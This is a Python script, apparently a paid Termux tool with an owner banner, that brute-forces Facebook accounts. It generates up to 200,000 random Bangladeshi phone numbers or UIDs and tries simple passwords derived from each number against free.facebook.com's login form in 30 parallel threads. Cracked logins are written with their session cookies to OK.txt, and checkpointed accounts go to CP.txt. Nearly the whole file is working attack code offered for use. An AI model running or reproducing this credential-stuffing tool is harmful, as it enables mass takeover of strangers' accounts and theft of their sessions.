#!/usr/bin/python3
#-*-coding:utf-8-*-

'''
'''

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python FIRE.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop

def clear():
	os.system('clear')
def back():
	login()

ah="Chowdhury-"
imt="-xnx"
ak=" Ariyan-"

try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
	kok.write(imt)
	kok.close()
	
loop = 0
oks = []
cps = []

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

def banner():
	os.system("clear")
	print("")
	print("%s    █████  ██      ███████ ██   ██ "%(M))
	print("%s   ██   ██ ██      ██       ██ ██  "%(M))
	print("%s   ███████ ██      █████     ███   "%(M))
	print("%s   ██   ██ ██      ██       ██ ██   "%(M))
	print("%s   ██   ██ ███████ ███████ ██   ██ "%(M))
	
	print("")
	print("%s╔═════════════════════════════════════════════╗"%(Z))
	print("%s║%s  Owner   : %sLx Ariyan Chowdhury              %s║"%(Z,U,M,Z))
	print("%s║%s  Tool Type   : Cra4k  %s                      ║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/lxariyanchowdhury1 %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s1.1                             %s║"%(Z,B,H,Z))
	print("%s╚═════════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s%s%s%sUIDCR4K%s™%s%s'%(M,H,B,H,B,H,M))
	print("")

def linex():
	print("%s════════════════════════════════════════════%s\n"%(Z,N))


def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def lx():
	os.system('clear')
	banner()
	print(f' {H}[1] RANDOM BD NUMBER ID CRACK')
	print(f' {M}[2] BACK\n')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='9':
		random_uid()
	elif opt =='2':
		lx()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def random_uid():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(30000):
		nmp = ''.join(random.choice(string.digits) for _ in range(11))
		user.append("1000"+nmp)
	print(f' {H}EXAMPLE : 123456,1234567,12345678 {N}\n')
	pwx = input(f' {B}PUT PASS : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}√{M}√ {N}")
		linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

def random_number():
	user=[]
	os.system('clear')
	banner()
	print(f"          {U}INPUT YOUR MOBILE NUMBER{N}\n         {U} ONLY FOR BANGLADESH{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H}01872345678{Z}]\n")
	fkode = input(f'{K} INPUT YOUR NUMBER : {H}')
	if len(fkode) < 10:
		xox(f'\n{M} ERROR ! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(200000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)


def cracker(uid,pwx,tl):
	global loop
	global cps
	global oks
	try:
		for pasw in pwx:
			ses = requests.Session()
			heas = {"Host": "free.facebook.com",
				"dnt": "1","upgrade-insecure-requests": "1",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"accept-encoding": "gzip, deflate",
				"accept-language": "en-US,en;q=0.9",}
			link = ses.get("https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
			gett = sop(link.text, "html.parser")
			datax = gett.find("form",{"method":"post"})["action"]
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
				"try_number": "0",
				"unrecognized_tries": "0",
				"email": uid,
				"pass": pasw,
				"login": "Masuk",
				"bi_xrwh": "0"}
			cookie = dict(ses.cookies.get_dict())
			head = {"Host": "free.facebook.com",
				"content-length": "160",
				"cache-control": "max-age=0",
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": "Android",
				"sec-ch-ua-platform-version": "10.0.0",
				"sec-ch-ua-model": "Infinix X612B",
				"origin": "https://free.facebook.com",
				"upgrade-insecure-requests": "1",
				"dnt": "1",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android 10; Infinix X612B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://free.facebook.com/",
				"accept-encoding": "gzip, deflate",
				"accept-language": "en-US,en;q=0.9"}
			xnxx = ses.post(f"https://free.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
			fb_cookies=ses.cookies.get_dict().keys()
			if 'c_user' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[65:80]
				print('\033[1;32m [Lx-OK] '+uid+' | '+pasw+' | '+coki+'\033[0;97m')
				open('OK.txt', 'a').write(uid+'|'+pasw+' | '+coki+'\n')
				oks.append(uidx)
				break		
			elif 'checkpoint' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [Lx-CP] '+uid+' | '+pasw+'\033[0;97m')
				open('CP.txt', 'a').write(uid+'|'+pasw+'\n')
				cps.append(uidx)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()
	except:
		pass




def Fuck():
    UMO="ARIYAN-"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(banner)
    DARK=requests.get("https://github.com/lxariyanchowdhury/Alex_Paid/blob/main/IP.txt").text
    if id in DARK:
        lx()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/I.love.you.Sabiha.Tomar.issa.manei.amar.issa")
        time.sleep(3.0)
        
        os.system("clear")
        print(banner)
        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("                Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am Lx Ariyan Chowdhury er  ROBOT and my boss is Ariyan Sir. this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://www.facebook.com/I.love.you.Sabiha.Tomar.issa.manei.amar.issa")
        
lx()       


